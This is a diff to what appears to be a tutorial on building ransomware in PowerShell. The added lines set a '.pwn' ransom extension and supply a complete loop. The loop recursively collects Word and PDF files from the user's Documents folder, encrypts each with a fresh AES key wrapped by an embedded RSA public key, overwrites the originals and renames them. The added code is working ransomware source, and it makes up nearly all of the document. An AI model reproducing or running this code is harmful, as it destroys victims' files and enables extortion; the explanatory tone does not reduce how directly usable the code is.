@@ -123,6 +123,7 @@ At this point - we can start the encryption part:
 ```powershell
 $public_key_xml = "INSERT RSA PUBLIC KEY XML HERE"
 $extensions = ".doc,docx,.pdf"
+$ransom_extension = ".pwn"
 $base_folder = [Environment]::GetFolderPath("MyDocuments")
 $rsa = New-Object -TypeName System.Security.Cryptography.RSACryptoServiceProvider
 $rsa.FromXmlString($public_key_xml)
@@ -131,5 +132,39 @@ $extensions = $extensions.Split(",") | % {"*" + $_.Trim()}
 
 - The `public key` is "baked-in" and saved in the `$public_key_xml` variable.
 - The set of file extensions is saved in the `$extensions` variable.
+- The new file extention we will be using is is saved in `$ransom_extension`.
 - We will look for all files under the `$base_folder`, which is my case is the "Documents" folder, but you can do whatever you like.
 - We create a new `RSA` instance (`$rsa`) and import the `public key` into that instance.
+
+Now we can iterate all the files and encrypt each one:
+```powershell
+foreach ($f in (Get-ChildItem -Force -ErrorAction SilentlyContinue -Recurse -Path $base_folder -Include $extensions).fullname)
+{
+    $bytes = Get-Content $f -Encoding Byte -ReadCount 0
+	
+    $aes = [Security.Cryptography.SymmetricAlgorithm]::Create('AesManaged')
+    $aes.Mode = [Security.Cryptography.CipherMode]::CBC
+    $aes.Padding = "PKCS7"
+    
+	$aes_key = 1..16|%{[byte](Get-Random -Minimum ([byte]::MinValue) -Maximum ([byte]::MaxValue))}
+    $aes_key_material = $aes_key + $aes.IV
+    $aes_key_material = $rsa.Encrypt($aes_key_material, $false)
+
+    $aes_encryptor = $aes.CreateEncryptor($aes_key, $aes.IV)
+    $stream = New-Object -TypeName IO.MemoryStream
+    $enc_stream = New-Object -TypeName Security.Cryptography.CryptoStream -ArgumentList @($stream, $aes_encryptor, [Security.Cryptography.CryptoStreamMode]::Write)
+    $enc_stream.Write($bytes, 0, $bytes.Length)
+    $enc_stream.FlushFinalBlock()
+    $encrypted = $stream.ToArray()
+    $encrypted += $aes_key_material
+	
+    Set-Content -Path $f -Value $encrypted -Encoding Byte -Force
+    Rename-Item -Path $f -NewName ($f + $ransom_extension)
+    $aes.Clear()
+    $stream.SetLength(0)
+    $stream.Close()
+    $enc_stream.Clear()
+    $enc_stream.Close()
+}
+```
+
